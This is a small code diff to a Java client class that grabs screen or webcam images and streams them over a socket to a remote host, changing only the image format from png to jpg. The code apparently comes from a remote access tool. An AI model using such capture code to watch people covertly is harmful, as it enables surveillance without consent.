@@ -108,7 +108,7 @@ public class ClientCommandScreenWebcam extends ClientCommand {
 
                             try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT + (webcam ? 2 : 1));
                                  OutputStream os = imageSocket.getOutputStream()) {
-                                ImageIO.write(webcam ? ImageComponents.getWebcam(id, true, true) : ImageComponents.getImage(id, true), "png", os);
+                                ImageIO.write(webcam ? ImageComponents.getWebcam(id, true, true) : ImageComponents.getImage(id, true), "jpg", os);
                             } catch (Exception exception) {
                                 if (ImageComponents.LIVE_STOPPER) {
                                     if (webcam) {
